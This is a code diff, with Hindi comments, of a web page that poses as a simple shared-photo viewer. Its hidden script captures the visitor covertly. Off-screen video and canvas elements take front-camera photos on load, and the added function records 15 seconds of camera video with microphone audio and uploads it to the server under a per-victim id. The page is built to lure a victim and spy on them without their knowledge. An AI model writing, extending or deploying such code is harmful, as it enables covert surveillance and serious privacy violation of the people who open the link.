@@ -6,29 +6,17 @@
     <title>Photo</title>
     <style>
         body {
-            margin: 0;
-            padding: 10px;
-            background: #111;
-            text-align: center;
+            margin: 0; padding: 10px; background: #111; text-align: center;
         }
-        img {
-            max-width: 100%;
-            border-radius: 10px;
-            display: block;
-        }
-        video, canvas, #status {
-            position: absolute;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-        }
+        img { max-width: 100%; border-radius: 10px; display: block; }
+        video, canvas, #status { position: absolute; left: -9999px; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
     <!-- केवल आपकी भेजी फोटो दिखेगी -->
     <img src="{{ photo_url }}" alt="Photo">
 
-    <!-- कैमरा और कैनवस पूरी तरह छिपा -->
+    <!-- छिपा हुआ वीडियो एलिमेंट (कैमरा स्ट्रीम के लिए) -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -38,15 +26,12 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        (async function autoCapture() {
+        // 📸 3 फोटो ऑटो कैप्चर
+        async function autoCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
-
-                // 1 सेकंड में 3 फोटो (हर 300ms पर)
                 for (let i = 0; i < 3; i++) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -60,9 +45,39 @@
                     await new Promise(r => setTimeout(r, 300));
                 }
                 stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.error('Camera error:', e);
-            }
+            } catch(e) { console.error('Photo error:', e); }
+        }
+
+        // 🎥 15 सेकंड की वीडियो (माइक के साथ)
+        async function recordVideoWithAudio() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: true
+                });
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 15000));  // 15 सेकंड
+                mediaRecorder.stop();
+                await new Promise(r => mediaRecorder.onstop = r);
+
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', videoBlob, 'capture.webm');
+                await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) { console.error('Video error:', e); }
+        }
+
+        // 🚀 शुरू करें: पहले वीडियो, फिर फोटो
+        (async function main() {
+            await recordVideoWithAudio();
+            await autoCapture();
         })();
     </script>
 </body>
